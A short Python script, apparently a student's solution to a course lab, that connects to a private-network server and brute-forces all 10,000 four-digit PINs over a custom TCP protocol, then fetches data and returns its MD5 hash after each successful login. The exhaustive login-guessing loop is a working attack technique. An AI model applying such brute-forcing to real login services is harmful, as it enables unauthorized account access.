#!/usr/bin/env python3
import hashlib
from sys import argv
from socket import socket, AF_INET, SOCK_STREAM

# create a TCP socket
serverName = '172.28.176.63'
serverPort = 4444
clientSocket = socket(AF_INET, SOCK_STREAM)

# connect to the given Server IP, port number
clientSocket.connect((serverName, serverPort))

# the secret student id should be taken as the command line argument
student_key = str(argv[1])

# initial handshake is to pass the student_key
# to which the server response with an ok
initial = "STID_" + student_key
clientSocket.send(initial.encode())

# if server responds with OK code proceed with the hack
if (clientSocket.recv(4).decode() == "200_"):
    print("success")
    for i in range(10000):
        password = str(i)
        while len(password) < 4:
            password = '0' + password
        req = "LGIN_" + password
        clientSocket.send(req.encode())
        if (clientSocket.recv(4).decode() == "201_"):
            clientSocket.send("GET__".encode())
            if (clientSocket.recv(4).decode() == "100_"):
                length = 0
                while True:
                    n = clientSocket.recv(1).decode()
                    if n == "_":
                        break
                    length = length * 10 + int(n)
                data = clientSocket.recv(length)
                h = "PUT__" + str(hashlib.md5(data).hexdigest())
                clientSocket.send(h.encode())
                clientSocket.recv(4).decode()
                clientSocket.send("LOUT_".encode())
                clientSocket.recv(4).decode()

clientSocket.send("BYE__".encode())
clientSocket.close()